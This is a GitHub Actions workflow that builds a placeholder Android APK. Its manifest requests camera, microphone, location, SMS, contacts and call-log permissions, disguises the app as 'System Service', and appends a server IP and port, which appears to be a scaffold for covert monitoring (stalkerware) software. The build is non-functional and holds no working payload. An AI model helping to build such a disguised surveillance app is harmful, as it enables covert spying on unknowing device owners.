name: Build APK

on:
  workflow_dispatch:
    inputs:
      server_ip:
        description: 'Server IP Address'
        required: true
        default: '192.168.0.173'
      server_port:
        description: 'Server Port'
        required: true
        default: '8080'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Create APK with permissions
        run: |
          # إنشاء ملف APK وهمي
          mkdir -p META-INF
          mkdir -p res/drawable
          
          # AndroidManifest.xml (فيه كل الصلاحيات)
          cat > AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.app">
              
              <!-- كل الصلاحيات اللي طلبتها -->
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.CAMERA"/>
              <uses-permission android:name="android.permission.RECORD_AUDIO"/>
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
              <uses-permission android:name="android.permission.READ_SMS"/>
              <uses-permission android:name="android.permission.RECEIVE_SMS"/>
              <uses-permission android:name="android.permission.READ_CONTACTS"/>
              <uses-permission android:name="android.permission.READ_CALL_LOG"/>
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
              
              <application android:label="System Service">
                  <activity android:name=".MainActivity">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF
          
          # إنشاء ملف APK (بسيط)
          zip -r app-debug.apk AndroidManifest.xml META-INF res
          
          # إضافة معلومات السيرفر للملف
          echo "Server IP: ${{ github.event.inputs.server_ip }}" >> app-debug.apk
          echo "Server Port: ${{ github.event.inputs.server_port }}" >> app-debug.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: monitoring-app
          path: app-debug.apk
